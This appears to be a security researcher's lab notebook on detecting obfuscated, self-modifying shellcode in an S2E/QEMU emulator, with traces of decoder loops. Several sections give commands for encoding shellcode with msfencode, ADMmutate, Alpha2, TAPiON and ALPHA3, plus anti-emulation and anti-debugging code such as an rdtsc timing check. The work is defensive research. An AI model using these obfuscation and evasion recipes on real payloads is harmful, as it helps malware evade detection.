3) Devel clustering (new snapshots made) when seqnums between writes > 5 (or 10 insns). eg #3,5,7 are on one snapshot and 13,15,17 in another, regardless if 13,15,17 don't overwrite what 3,5,7 wrote. Seqnum is globally monotonically increasing (ie dynamic) (addr x can have multiple seqnums, eg 13,15,17)
4) Manually follow sganai try to determine if it is modifying intrablock insns.



         s2e->getCorePlugin()->onTranslateInstructionEnd_RJF.emit(signal, state, tb, pc, nextpc); //RJF

/home/s2e/s2e/dasos/s2e/./s2e/qemu/cpu-exec.c:174:static TranslationBlock *tb_find_slow(target_ulong pc,
/home/s2e/s2e/dasos/s2e/./s2e/qemu/cpu-exec.c:223:static inline TranslationBlock *tb_find_fast(void)

http://comments.gmane.org/gmane.comp.emulators.qemu/67207
Insert op codes between translated instructions to count and check for writes
Or just treat each instruction as a block


---7 March
 >> oTBS pc: 0xbfadb810
 >> oTIE pc: 0xbfadb810:0x00 nextpc: bfadb812 len: 2
!!* pc != prev insn's next_pc; 0xbfadb810 != bfadb811
  1  2B @0xbfadb810:*da d4                              fcmovbe st0, st4         nextPC: 0xbfadb812
 >> oTIE pc: 0xbfadb812:0x02 nextpc: bfadb817 len: 5
  2  5B @0xbfadb812: b8 92 ba 1e 5c                     mov eax, 0x5c1eba92      nextPC: 0xbfadb817
 >> oTBE Target by pc: 0xbfadb817 to pc: 0xbfadb817
 >> oTIE pc: 0xbfadb817:0x07 nextpc: bfadb81b len: 4
  3  4B @0xbfadb817: d9 74 24 f4                        fnstenv [esp-0xc]        nextPC: 0xbfadb81b
 >> oTIE pc: 0xbfadb81b:0x0b nextpc: bfadb81c len: 1
  4  1B @0xbfadb81b: 5b                                 pop ebx                  nextPC: 0xbfadb81c
 >> oTIE pc: 0xbfadb81c:0x0c nextpc: bfadb81e len: 2
  5  2B @0xbfadb81c: 29 c9                              sub ecx, ecx             nextPC: 0xbfadb81e
 >> oTIE pc: 0xbfadb81e:0x0e nextpc: bfadb820 len: 2
  6  2B @0xbfadb81e: b1 0b                              mov cl, 0xb              nextPC: 0xbfadb820
 >> oTIE pc: 0xbfadb820:0x10 nextpc: bfadb823 len: 3
  7  3B @0xbfadb820: 83 c3 04                           add ebx, 0x4             nextPC: 0xbfadb823
 >> oTIE pc: 0xbfadb823:0x13 nextpc: bfadb826 len: 3
  8  3B @0xbfadb823: 31 43 14                           xor [ebx+0x14], eax      nextPC: 0xbfadb826
 >> oTIE pc: 0xbfadb826:0x16 nextpc: bfadb829 len: 3
  9  3B @0xbfadb826: 03 43 86                           add eax, [ebx-0x7a]      nextPC: 0xbfadb829
 >> oTIE pc: 0xbfadb829:0x19 nextpc: bfadb82a len: 1
 10  1B @0xbfadb829: 58                                 pop eax                  nextPC: 0xbfadb82a
 >> oTBE Target by pc: 0xbfadb82a to pc: 0xbfadb7e3
 >> oTIE pc: 0xbfadb82a:0x1a nextpc: ffffffff len: 1079134165
 11  2B @0xbfadb82a: eb b7                              jmp 0xffffffffffffffb9   nextPC: 0xbfadb7e3
 >> oExc pc: 0xbfadb810 exception_idx: 239
 >> oPC prev: 3 curr: 0
 >> oPC prev: 0 curr: 3
 >> oEI pc: 0xbfadb810
 >> oEI pc: 0xbfadb812
 >> oEI pc: 0xbfadb817
 >> oEI pc: 0xbfadb81b
 >> oEI pc: 0xbfadb81c
 >> oEI pc: 0xbfadb81e
 >> oEI pc: 0xbfadb820
 >> oPF addr: 0x00000018 iswrite: 0
 >> oExc pc: 0xbfadb823 exception_idx: 14

Note that exception_idx: 239 is "coprocessor not found," and oPF addr is 0x18. This seems to mean that ebx is set to 0x0 bc the getPC doesn't work here. Verify ebx value. See if we can fudge this getPc?


------12 AMrch
./rangedxorencode.pl -i ../ByteArrays/hw.rawshell -o rangedxorencode.rawshell -f 10 -l 20 -k 0xff
MAde ranged xor encoder. Tried to make overlapping and separate enclosed shells, but it failed. Needs further investigation.

add eax, [ebx+0x14] 


The following is the output of our system running sganai at the point where the xor overwrites the next insn
>> Write to previously translated insn! at pc 0xbfd84938
 >> oDMA Write by seq_num: 7 pc: 0xbfd84933:0x13 to addr: 0xbfd84938 len: 4B value:  0x14  0xe2  0xf5  0xeb 
 >> >> oDMA value in memory at that address:  0x14  0xe2  0xf5  0xeb 
 >> oEI pc: 0xbfd84933
  7:  8: 2  3B @0xbfd84933: 31 43 14                           xor [ebx+0x14], eax      nextPC: 0xbfd84936
 >> DEBUG: oEI retranslate triggered at pc 0xbfd84933
 >> oExc pc: 0xbfd84936 exception_idx: 239(0xef)
 >> oPC prev: 3 curr: 0
 >> oPC prev: 0 curr: 3
 >> oTBS pc: 0xbfd84936
 >> oTIE pc: 0xbfd84936:0x16 nextpc: bfd84939 len: 3
!!* pc != prev insn's next_pc; 0xbfd84936 != bfd848f3
  0: 12: 3  3B @0xbfd84936: 03 43 14                           add eax, [ebx+0x14]      nextPC: 0xbfd84939
 >> oTBE Target by pc: 0xbfd84939 to pc: 0xbfd8493b
 >> oTBE Target by pc: 0xbfd84939 to pc: 0xbfd84930
 >> oTIE pc: 0xbfd84939:0x19 nextpc: bfd84930 len: 2
  0: 13: 3  2B @0xbfd84939: e2 f5                              loop 0xfffffffffffffff7  nextPC: 0xbfd84930
 >> oEI pc: 0xbfd84936
  8: 12: 3  3B @0xbfd84936: 03 43 14                           add eax, [ebx+0x14]      nextPC: 0xbfd84939
 >> oEB pc: 0xbfd84939
 >> oEI pc: 0xbfd84939
  9: 13: 3  2B @0xbfd84939: e2 f5                              loop 0xfffffffffffffff7  nextPC: 0xbfd84930
 >> oExc pc: 0xbfd84930 exception_idx: 239(0xef)



----------2 May 2013
CLET
./clet/clet -S ../ByteArrays/hw.rawshell -d > hw-clet.rawshell
./PrintShell.sh hw-clet.rawshell -x


ADMmutate expects a NOP sled in the beginning...
echo `perl -e 'print "A"x200'` > admm-in.rawshell
cat ../ByteArrays/hw.rawshell >> admm-in.rawshell
Had to modify the source to not care about a retaddr (no strstr if conditional, no apply_offset_mod), also added file output of result to admm-out.rawshell (which I copied to ByteArrays/hw-admm.rawshell)
cat admm-in.rawshell | ./ADMmutate-0.8.4/m7 -i  -o 0x000000C8 -n 0x41  
// note that -o is unused by the program, but non zero value needed to pass argument verification
The final jump was short by 1, manually incremented its value with hexedit


Alpha2
Alpha2 expects the getPC to already be done. Our wrapper puts the base addr into EAX, so leverage that.
cat ../../ByteArrays/hw.rawshell | ./alpha2 eax > ../hw-alpha2.rawshell


TAPiON http://pb.specialised.info/all/tapion/
wine tapion2.exe ../../../ByteArrays/hw.rawshell R 1
--------------------------------------------------------------------
TAPiON2 (ver. 0.1c) Polymorphic Decryptor Generator
by Piotr Bania <bania.piotr@gmail.com>
http://pb.specialised.info
--------------------------------------------------------------------

[+] Garbage step is randomized!
[+] Using jump garbaging
[+] Trying to open ../../../ByteArrays/hw.rawshell
[+] Readen 41 bytes
[+] Using long jump!
[+] Crypting block 0032d630 with db85ff8b as key
[+] Crypting block 0032d62e with db85ff8b as key
[+] Crypting block 0032d62c with db85ff8b as key
[+] Crypting block 0032d62a with db85ff8b as key
[+] Crypting block 0032d628 with db85ff8b as key
[+] Crypting block 0032d626 with db85ff8b as key
[+] Crypting block 0032d624 with db85ff8b as key
[+] Crypting block 0032d622 with db85ff8b as key
[+] Crypting block 0032d620 with db85ff8b as key
[+] Crypting block 0032d61e with db85ff8b as key
[+] Crypting block 0032d61c with db85ff8b as key
[+] Crypting block 0032d61a with db85ff8b as key
[+] Crypting block 0032d618 with db85ff8b as key
[+] Crypting block 0032d616 with db85ff8b as key
[+] Crypting block 0032d614 with db85ff8b as key
[+] Crypting block 0032d612 with db85ff8b as key
[+] Crypting block 0032d610 with db85ff8b as key
[+] Crypting block 0032d60e with db85ff8b as key
[+] Crypting block 0032d60c with db85ff8b as key
[+] Crypting block 0032d60a with db85ff8b as key
[+] Crypting block 0032d608 with db85ff8b as key
[+] The decryptor body was generated!
[+] Decryptor body size = 288 bytes
[+] Shellcode size = 41 bytes
[+] Decryptor + Shellcode size = 329 bytes
[+] Magic byte is 8B
[+] Crypto steping = 2 byte(s)
[+] Pass steping = 0 byte(s)
[+] Shellcode dumped to ../../../ByteArrays/hw.rawshell.tapion_bin
[+] Written 334 bytes
[+] Shellcode header stored to ../../../ByteArrays/hw.rawshell.tapion_bin.h


Shikata Ga Nai
encode the default: msfencode -c 1 -i msfe-in.rawshell -t raw -o msfe-out-sganai.rawshell -v -e x86/shikata_ga_nai
http://www.debasish.in/2011/10/encoding-your-handmade-shell-code-using.html
See 'man 7 undocumented' for help when manual pages are not available.
[s2e@s2e:~/s2e]$ msfencode -h

    Usage: /opt/metasploit/apps/pro/msf3/msfencode <options>

OPTIONS:

    -a <opt>  The architecture to encode as
    -b <opt>  The list of characters to avoid: '\x00\xff'
    -c <opt>  The number of times to encode the data
    -d <opt>  Specify the directory in which to look for EXE templates
    -e <opt>  The encoder to use
    -h        Help banner
    -i <opt>  Encode the contents of the supplied file path
    -k        Keep template working; run payload in new thread (use with -x)
    -l        List available encoders
    -m <opt>  Specifies an additional module search path
    -n        Dump encoder information
    -o <opt>  The output file
    -p <opt>  The platform to encode for
    -s <opt>  The maximum size of the encoded data
    -t <opt>  The output format: raw,ruby,rb,perl,pl,bash,sh,c,js_be,js_le,java,dll,exe,exe-small,exe-only,elf,macho,vba,vba-exe,vbs,loop-vbs,asp,aspx,war,psh,psh-net
    -v        Increase verbosity
    -x <opt>  Specify an alternate executable template

[s2e@s2e:~/s2e/dasos/ObfuscationTesting]$ msfencode -l -a x86

Framework Encoders (architectures: x86)
=======================================

    Name                          Rank       Description
    ----                          ----       -----------
    generic/none                  normal     The "none" Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


I want to be able to run: bloxor, call4_dword_xor, countdown, fnstenv_mov, jmp_call_additive, shikata_ga_nai. Possibly also context_cpuid/stat/time

msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/countdown -o hw-countdown.rawshell
msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/bloxor -o hw-bloxor.rawshell
msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/call4_dword_xor -o hw-call4dword.rawshell
msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/fnstenv_mov -o hw-fnstenv_mov.rawshell
msfencode -i ../ByteArrays/hw.rawshell -b '\x00' -t raw -e x86/jmp_call_additive -o hw-jmpcall.rawshell


Anti-emulation techniques: (http://hackforums.forumotion.net/t28-malware-analysis-anti-debugging-anti-emulation)
Made testers for: undocumented SALC insn; SAL; test alternate imm encoding (the byte values given in link did not execute, but nasm's assembled values for test with imm did run fine).
SAL tester had to be hand coded:
31 C0    xor eax, eax ; eax = 0
B0 01    mov al, 1    ; eax = 1
C0 F0 01 sal al, 1    ; shift arithmetic left (sometimes ignored by emus bc assemblers never generate it bc equiv to SHL); eax = 2
CD 80    int 80       ; syscall (2) or 1 if sal not implemented




Other methods to try out later on (as time allows)
Call fn twice and make sure it returns two different values (if it should, like time)
push offset handler
push dword ptr fs:[0]
mov fs:[0],esp
rdtsc
push eax
xor eax, eax
div eax ;trigger exception
rdtsc
sub eax, [esp] ;ticks delta
add esp, 4
pop fs:[0]
add esp, 4
cmp eax, 10000h ;threshold
jb @not_debugged
@debugged:
...
@not_debugged:
...
handler:
mov ecx, [esp+0Ch]
add dword ptr [ecx+0B8h], 2 ;skip div
xor eax, eax
ret

Using coprocessor FPU instructions is another way to overextend the emulator because most emulators do not emulate the FPU instructions.
Prizzy polymorphic engine (PPE) can generate 43 different coprocessor instructions for the use of its polymorphic decryptor.
If these FPU instructions are not provided, the decryption on Prizzy does not execute.
MMX and FPU
MMX and FPU registers are overlapping, but in opposite directions: 0, 1,2,3... mapped to 7,6,5...
Thus, a single FPU operation on st0 will modify fst, st0, but also mm7 (and cr0, under XP).
d9eb: fldpi
=> fst = 03800h
   st0 = 04000c90fdaa22168c235h
   mm7 =     0c90fdaa22168c235h
   cr0 = 080010031h (under XP)

aad
aad is officially defined to use only 10/0Ah as a default operand, but can just use any other operand.
it makes it the first Add and Multiply opcode, as al = ah * operand + al.
66B8 2503; mov ax 325 ax = 325h
D507; aad 7
=> ax = 3 * 7 + 25h = 3ah
aam
Similar logic for aam:
it's officially defined with 10/0ah, but it just works with any byte.
it's a division, and quotient and remainder go to ah and al respectively.
B0 3A; mov al, 3A al = 3ah
d403;  aam 3
=> ah = 3ah / 3 = 13h
   al = 3ah % 3 = 1

str/sldt
Like smsw, they work on DWORD or WORD on registers, but only on WORD in memory.
   0f 00c8: str eax
=> eax = 00000028h (XP)
66 0f 00c8: str ax
=> ax  =     0028h (XP)
   0f 0008: str [eax]
=> word ptr [eax] = 0028h (XP)
it's the same for sldt.



found Alpha3. Had to chmod755 *.py, run dos2unix (strip EOL), remove test from loaded modules and its reference at about line 238.
cat ../../ByteArrays/hw.rawshell | ./ALPHA3.py x86 ascii mixedcase eax > hw-alpha3.rawshell
 >> oTBS pc: 0xbff1cbf0
 >> oTIE pc: 0xbff1cbf0:0x00 nextpc: bff1cbf5 len: 5
  0:  0: 1  5B @0xbff1cbf0: 68 66 66 66 66                     push dword 0x66666666    nextPC: 0xbff1cbf5
 >> oTIE pc: 0xbff1cbf5:0x05 nextpc: bff1cbf9 len: 4
  0:  1: 1  4B @0xbff1cbf5: 6b 34 64 69                        imul esi, [esp], 0x69    nextPC: 0xbff1cbf9
 >> oPF addr: 0x3fd545e8 iswrite: 0
[State 1] CPU dump
EAX=0xbff1cbf0
EBX=0x0
ECX=0xbff1c1e8
EDX=0xb7764340
ESI=0x400e3410
EDI=0x0
EBP=0xbff1c658
ESP=0xbff1c1f8
EIP=0xbff1cbf5
CR2=0x3fd545e8

esi = [esp] * 0x69 = [0x66666666]*0x69


BloXor:
https://github.com/pwnieexpress/metasploit-framework/blob/master/lib/rex/encoder/bloxor/bloxor.rb
      # Generate the decoder stub which is functionally equivalent to the following:
      #
      #  source  = &end;
      #  dest    = source + BLOCK_SIZE;
      #  counter = BLOCK_COUNT * ( BLOCK_SIZE / chunk_size );
      #  do
      #  {
      #     encoded = *(CHUNK_SIZE *)dest;
      #     dest += chunk_size;
      #     decoded = *(CHUNK_SIZE *)source;
      #     *(CHUNK_SIZE *)source = decoded ^ encoded;
      #     source += chunk_size;
      #  } while( --counter );
      #
      #  end:

>> Printing Exec_Trace (instructions in order of execution)
>>      0:  0: 1  5B @0xbfc19cb0: e8 ff ff ff ff                     call 0x4                 nextPC: 0xbfc19cb4   getPC onto stack
>>      1:  1: 2  2B @0xbfc19cb4: ff c0                              inc eax                  nextPC: 0xbfc19cb6   junk
>>      2:  2: 2  1B @0xbfc19cb6: 59                                 pop ecx                  nextPC: 0xbfc19cb7   ecx=PC=0x..b5
>>      3:  3: 2  2B @0xbfc19cb7: 6a 05                              push 0x5                 nextPC: 0xbfc19cb9   
>>      4:  4: 2  1B @0xbfc19cb9: 5b                                 pop ebx                  nextPC: 0xbfc19cba   ebx=0x5
>>      5:  5: 2  2B @0xbfc19cba: 29 d9                              sub ecx, ebx             nextPC: 0xbfc19cbc   ecx=-ebx=0x..b5-0x5=0x..b0
>>      6:  6: 2  2B @0xbfc19cbc: 6a 4d                              push 0x4d                nextPC: 0xbfc19cbe   
>>      7:  7: 2  3B @0xbfc19cbe: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cc1   ecx=+0x4d=0x..fd
>>      8:  8: 2  1B @0xbfc19cc1: 5b                                 pop ebx                  nextPC: 0xbfc19cc2   ebx=0x4d
>>      9:  9: 2  2B @0xbfc19cc2: 89 cf                              mov edi, ecx             nextPC: 0xbfc19cc4   edi=ecx=0x..fd
>>     10: 10: 2  2B @0xbfc19cc4: 6a 02                              push 0x2                 nextPC: 0xbfc19cc6
>>     11: 11: 2  3B @0xbfc19cc6: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cc9   edi+=0x2=0x..ff
>>     12: 12: 2  1B @0xbfc19cc9: 5b                                 pop ebx                  nextPC: 0xbfc19cca   ebx=0x..fd <- obs_sc[0]
>>     13: 13: 2  2B @0xbfc19cca: 6a 15                              push 0x15                nextPC: 0xbfc19ccc   
>>     14: 14: 2  1B @0xbfc19ccc: 5e                                 pop esi                  nextPC: 0xbfc19ccd   esi=0x15 <- counter
begin loop (counted 21 (0x15) times)
>>     15: 15: 2  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0   edx=[0x..ff] <- obs_sc[2]
>>     16: 16: 2  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     17: 17: 2  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5   edi+=0x2=0x.101 <-obs_sc[4]
>>     18: 18: 2  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6   ebx=0x2
>>     19: 19: 2  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8   push 4B of obs_sc[0]
>>     20: 20: 2  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9   eax = obs_sc
>>     21: 21: 2  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc   lob off left 2B
>>     22: 22: 2  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf   correct 2B location
>>     23: 23: 2  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1   ebx=eax=obs_sc[0..1]
>>     24: 24: 2  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3   ebx=sc[0..1]|sc[2..5]
>>     25: 25: 2  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5   eax=sc[0..1]&sc[2..5]
>>     26: 26: 2  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7   eax=!(eax)
>>     27: 27: 2  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9   eax=(!(sc[0..1]&sc[2..5]))&(sc[0..1]|sc[2..5]) = (!(x&y)&(x|y))
>>     28: 28: 2  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb   ax holds decoded i, i+1
>>     29: 29: 3  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee   <- writes i, i+1
>>     30: 30: 3  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>     31: 31: 3  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3   ecx+=0x2=0x..ff
>>     32: 32: 3  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4   ebx=0x2
>>     33: 33: 3  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5   dec counter
>>     34: 34: 3  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7 end loop, if 0 don't jump
>>     35: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>     36: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     37: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>     38: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>     39: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>     40: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>     41: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>     42: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>     43: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>     44: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>     45: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>     46: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>     47: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>     48: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>     49: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>     50: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>     51: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>     52: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>     53: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>     54: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>     55: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>     56: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     57: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>     58: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>     59: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>     60: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>     61: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>     62: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>     63: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>     64: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>     65: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>     66: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>     67: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>     68: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>     69: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>     70: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>     71: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>     72: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>     73: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>     74: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>     75: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>     76: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     77: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>     78: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>     79: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>     80: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>     81: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>     82: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>     83: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>     84: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>     85: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>     86: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>     87: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>     88: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>     89: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>     90: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>     91: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>     92: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>     93: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>     94: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>     95: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>     96: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>     97: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>     98: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>     99: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    100: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    101: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
>>    102: 43: 4  3B @0xbfc19cdc: c1 e8 10                           shr eax, 0x10            nextPC: 0xbfc19cdf
>>    103: 44: 4  2B @0xbfc19cdf: 89 c3                              mov ebx, eax             nextPC: 0xbfc19ce1
>>    104: 45: 4  2B @0xbfc19ce1: 09 d3                              or ebx, edx              nextPC: 0xbfc19ce3
>>    105: 46: 4  2B @0xbfc19ce3: 21 d0                              and eax, edx             nextPC: 0xbfc19ce5
>>    106: 47: 4  2B @0xbfc19ce5: f7 d0                              not eax                  nextPC: 0xbfc19ce7
>>    107: 48: 4  2B @0xbfc19ce7: 21 d8                              and eax, ebx             nextPC: 0xbfc19ce9
>>    108: 49: 4  2B @0xbfc19ce9: 66 50                              push ax                  nextPC: 0xbfc19ceb
>>    109: 50: 4  3B @0xbfc19ceb: 66 8f 01                           pop word [ecx]           nextPC: 0xbfc19cee
>>    110: 51: 4  2B @0xbfc19cee: 6a 02                              push 0x2                 nextPC: 0xbfc19cf0
>>    111: 52: 4  3B @0xbfc19cf0: 03 0c 24                           add ecx, [esp]           nextPC: 0xbfc19cf3
>>    112: 53: 4  1B @0xbfc19cf3: 5b                                 pop ebx                  nextPC: 0xbfc19cf4
>>    113: 54: 4  1B @0xbfc19cf4: 4e                                 dec esi                  nextPC: 0xbfc19cf5
>>    114: 55: 4  2B @0xbfc19cf5: 85 f6                              test esi, esi            nextPC: 0xbfc19cf7
>>    115: 36: 4  3B @0xbfc19ccd: 0f b7 17                           movzx edx, word [edi]    nextPC: 0xbfc19cd0
>>    116: 37: 4  2B @0xbfc19cd0: 6a 02                              push 0x2                 nextPC: 0xbfc19cd2
>>    117: 38: 4  3B @0xbfc19cd2: 03 3c 24                           add edi, [esp]           nextPC: 0xbfc19cd5
>>    118: 39: 4  1B @0xbfc19cd5: 5b                                 pop ebx                  nextPC: 0xbfc19cd6
>>    119: 40: 4  2B @0xbfc19cd6: ff 31                              push dword [ecx]         nextPC: 0xbfc19cd8
>>    120: 41: 4  1B @0xbfc19cd8: 58                                 pop eax                  nextPC: 0xbfc19cd9
>>    121: 42: 4  3B @0xbfc19cd9: c1 e0 10                           shl eax, 0x10            nextPC: 0xbfc19cdc
